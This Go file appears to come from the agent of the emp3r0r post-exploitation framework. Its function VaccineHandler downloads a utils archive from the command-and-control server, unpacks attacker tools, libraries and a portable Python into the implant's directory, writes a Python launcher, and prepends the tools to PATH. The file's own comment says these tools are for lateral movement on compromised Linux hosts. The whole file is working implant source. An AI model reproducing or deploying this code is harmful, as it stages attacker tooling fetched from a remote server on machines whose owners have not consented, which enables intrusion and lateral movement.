package agent

// build +linux

/*
install tools to emp3r0r_data.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

var (
	PythonArchive = emp3r0r_data.UtilsPath + "/python3.9.tar.xz"
	PythonLib     = emp3r0r_data.UtilsPath + "/python3.9"
	PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")

	// run python scripts with this command
	// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s LD_LIBRARY_PATH=%s %s ",
		PythonPath, PythonLib, emp3r0r_data.LibPath,
		emp3r0r_data.UtilsPath+"/python3")

	// run python itself with this script
	PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
)

func VaccineHandler() (out string) {
	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.tar.bz2", emp3r0r_data.AgentRoot+"/utils.tar.bz2")
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.tar.bz2 to our PATH
	os.RemoveAll(emp3r0r_data.UtilsPath) // archiver fucking aborts when files already exist
	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}

	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.tar.bz2", emp3r0r_data.UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	os.RemoveAll(emp3r0r_data.LibPath) // archiver fucking aborts when files already exist
	if err = archiver.Unarchive(emp3r0r_data.UtilsPath+"/libs.tar.xz", emp3r0r_data.AgentRoot); err != nil {
		log.Printf("Unarchive: %v", err)
		out = fmt.Sprintf("Unarchive libs: %v", err)
	}

	// extract python3.9.tar.xz
	os.RemoveAll(PythonPath)
	if util.IsFileExist(PythonArchive) {
		if err = archiver.Unarchive(PythonArchive, emp3r0r_data.UtilsPath); err != nil {
			out = fmt.Sprintf("Unarchive python libs: %v", err)
			log.Print(out)
			return
		}
		// create launchers
		err = ioutil.WriteFile(emp3r0r_data.UtilsPath+"/python", []byte(PythonLauncher), 0755)
		if err != nil {
			out = fmt.Sprintf("Write python launcher: %v", err)
		}
	}
	os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")

	// update PATH in .bashrc
	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
	if !strings.Contains(exportPATH, emp3r0r_data.BashRC) {
		emp3r0r_data.BashRC += "\n" + exportPATH
		// extract bash please
		err = ExtractBash()
		if err != nil {
			log.Printf("[-] Cannot extract bash: %v", err)
		}
		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
			emp3r0r_data.DefaultShell = "/bin/sh"
		}
	}
	return
}
